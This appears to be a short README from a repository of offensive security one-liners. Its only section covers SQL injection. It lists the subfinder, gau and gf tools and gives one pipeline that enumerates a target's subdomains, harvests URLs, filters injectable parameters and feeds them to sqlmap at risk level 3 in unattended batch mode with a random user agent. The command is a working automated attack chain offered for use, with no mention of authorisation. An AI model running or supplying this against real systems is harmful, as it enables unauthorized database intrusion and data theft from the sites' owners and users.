# One-Liner-Collections
This Repositories contains list of One Liners with Descriptions and Installation requirements

─────────────────────────────────────────────────────────────────────────────────────────────────────



# SQL Injection

## Installation Requirements
1. Subfinder : https://github.com/projectdiscovery/subfinder 
2. GAU       : https://github.com/lc/gau
3. GF        : https://github.com/tomnomnom/gf

## OneLiner
```
subfinder -d http://TARGET.com -silent -all | gau - blacklist ttf,woff,svg,png | sort -u | gf sqli >gf_sqli.txt; sqlmap -m gf_sqli.txt --batch --risk 3 --random-agent | tee -a sqli_report.txt
```
